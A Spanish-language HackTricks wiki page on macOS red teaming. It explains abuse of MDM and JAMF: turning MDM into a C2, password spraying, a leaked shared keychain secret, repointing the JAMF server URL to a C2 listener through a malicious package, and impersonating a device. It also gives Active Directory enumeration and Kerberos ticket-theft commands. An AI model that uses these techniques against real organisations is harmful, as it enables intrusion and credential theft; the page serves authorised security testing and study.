# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube

**Encuentra e informa sobre vulnerabilidades críticas y explotables con un impacto real en el negocio.** Utiliza nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Abusando de MDMs

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Si logras **comprometer las credenciales de administrador** para acceder a la plataforma de gestión, puedes **comprometer potencialmente todos los ordenadores** distribuyendo tu malware en las máquinas.

Para el red teaming en entornos MacOS, se recomienda encarecidamente tener algún conocimiento de cómo funcionan los MDMs:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Usando MDM como un C2

Un MDM tendrá permiso para instalar, consultar o eliminar perfiles, instalar aplicaciones, crear cuentas de administrador locales, establecer contraseña de firmware, cambiar la clave de FileVault...

Para ejecutar tu propio MDM necesitas **que tu CSR sea firmado por un proveedor** que podrías intentar obtener con [**https://mdmcert.download/**](https://mdmcert.download/). Y para ejecutar tu propio MDM para dispositivos Apple podrías usar [**MicroMDM**](https://github.com/micromdm/micromdm).

Sin embargo, para instalar una aplicación en un dispositivo inscrito, aún necesitas que esté firmada por una cuenta de desarrollador... sin embargo, al inscribir el dispositivo en un MDM, el **dispositivo agrega el certificado SSL del MDM como una CA de confianza**, por lo que ahora puedes firmar cualquier cosa.

Para inscribir el dispositivo en un MDM, necesitas instalar un **`mobileconfig`** como root, que podría ser entregado a través de un **archivo pkg** (podrías comprimirlo en zip y cuando se descargue desde Safari se descomprimirá).

**El agente Mythic Orthrus** utiliza esta técnica.

### Abusando de JAMF PRO

JAMF puede ejecutar **scripts personalizados** (scripts desarrollados por el sysadmin), **payloads nativos** (creación de cuentas locales, establecer contraseña EFI, monitoreo de archivos/procesos...) y **MDM** (configuraciones de dispositivos, certificados de dispositivos...).

#### Autoinscripción de JAMF

Ve a una página como `https://<nombre-de-la-empresa>.jamfcloud.com/enroll/` para ver si tienen **autoinscripción habilitada**. Si la tienen, podría **pedir credenciales para acceder**.

Podrías usar el script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar un ataque de password spraying.

Además, después de encontrar credenciales adecuadas, podrías ser capaz de forzar otros nombres de usuario con el siguiente formulario:

![](<../../.gitbook/assets/image (107).png>)

#### Autenticación de dispositivo JAMF

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

El **binario `jamf`** contenía el secreto para abrir el llavero que en el momento del descubrimiento estaba **compartido** entre todos y era: **`jk23ucnq91jfu9aj`**.\
Además, jamf **persiste** como un **LaunchDaemon** en **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Toma de control del dispositivo JAMF

La **URL** de **JSS** (Jamf Software Server) que **`jamf`** utilizará se encuentra en **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Este archivo contiene básicamente la URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Entonces, un atacante podría dejar un paquete malicioso (`pkg`) que **sobrescriba este archivo** al instalarlo, configurando la **URL a un listener de Mythic C2 desde un agente Typhon** para poder abusar de JAMF como C2.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### Suplantación de JAMF

Para **suplantar la comunicación** entre un dispositivo y JMF necesitas:

* El **UUID** del dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* La **llave de cadena de JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain` que contiene el certificado del dispositivo

Con esta información, **crea una VM** con el **UUID** de Hardware **robado** y con **SIP deshabilitado**, coloca la **llave de cadena de JAMF,** **engancha** el **agente** de Jamf y roba su información.

#### Robo de secretos

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

También podrías monitorear la ubicación `/Library/Application Support/Jamf/tmp/` para los **scripts personalizados** que los administradores podrían querer ejecutar a través de Jamf, ya que son **colocados aquí, ejecutados y eliminados**. Estos scripts **podrían contener credenciales**.

Sin embargo, las **credenciales** podrían ser pasadas a estos scripts como **parámetros**, por lo que necesitarías monitorear `ps aux | grep -i jamf` (sin siquiera ser root).

El script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) puede escuchar nuevos archivos que se añaden y nuevos argumentos de proceso.

### Acceso Remoto a macOS

Y también sobre los **protocolos** **"especiales"** de **red** de **MacOS**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

En algunas ocasiones encontrarás que el **computador MacOS está conectado a un AD**. En este escenario deberías intentar **enumerar** el directorio activo como estás acostumbrado. Encuentra algo de **ayuda** en las siguientes páginas:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Una **herramienta local de MacOS** que también puede ayudarte es `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
También hay algunas herramientas preparadas para MacOS para enumerar automáticamente el AD y jugar con kerberos:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound es una extensión de la herramienta de auditoría Bloodhound que permite recopilar e ingerir relaciones de Active Directory en hosts de MacOS.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost es un proyecto de Objective-C diseñado para interactuar con las APIs Heimdal krb5 en macOS. El objetivo del proyecto es habilitar mejores pruebas de seguridad en torno a Kerberos en dispositivos macOS utilizando APIs nativas sin requerir ningún otro marco o paquetes en el objetivo.
* [**Orchard**](https://github.com/its-a-feature/Orchard): Herramienta de JavaScript para Automatización (JXA) para hacer enumeración de Active Directory.

### Información del Dominio
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Usuarios

Los tres tipos de usuarios de MacOS son:

* **Usuarios Locales** — Gestionados por el servicio local de OpenDirectory, no están conectados de ninguna manera al Active Directory.
* **Usuarios de Red** — Usuarios volátiles de Active Directory que requieren una conexión al servidor DC para autenticarse.
* **Usuarios Móviles** — Usuarios de Active Directory con una copia de seguridad local de sus credenciales y archivos.

La información local sobre usuarios y grupos se almacena en la carpeta _/var/db/dslocal/nodes/Default._\
Por ejemplo, la información sobre el usuario llamado _mark_ se almacena en _/var/db/dslocal/nodes/Default/users/mark.plist_ y la información sobre el grupo _admin_ está en _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Además de usar los bordes HasSession y AdminTo, **MacHound agrega tres nuevos bordes** a la base de datos de Bloodhound:

* **CanSSH** - entidad permitida para SSH al host
* **CanVNC** - entidad permitida para VNC al host
* **CanAE** - entidad permitida para ejecutar scripts de AppleEvent en el host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Más información en [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ contraseña

Obtén contraseñas usando:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Es posible acceder a la **`Computer$`** contraseña dentro del llavero del Sistema.

### Over-Pass-The-Hash

Obtén un TGT para un usuario y servicio específicos:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Una vez que se ha recopilado el TGT, es posible inyectarlo en la sesión actual con:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Con los tickets de servicio obtenidos, es posible intentar acceder a recursos compartidos en otras computadoras:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Accediendo al llavero

El llavero probablemente contiene información sensible que, si se accede sin generar un aviso, podría ayudar a avanzar en un ejercicio de red team:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Servicios Externos

El Red Teaming en MacOS es diferente al Red Teaming regular en Windows, ya que generalmente **MacOS está integrado con varias plataformas externas directamente**. Una configuración común de MacOS es acceder a la computadora usando **credenciales sincronizadas de OneLogin y acceder a varios servicios externos** (como github, aws...) a través de OneLogin.

## Técnicas Misceláneas de Red Team

### Safari

Cuando se descarga un archivo en Safari, si es un archivo "seguro", se **abrirá automáticamente**. Así que, por ejemplo, si **descargas un zip**, se descomprimirá automáticamente:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Referencias

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube

**Encuentra y reporta vulnerabilidades críticas y explotables con un impacto real en el negocio.** Usa nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
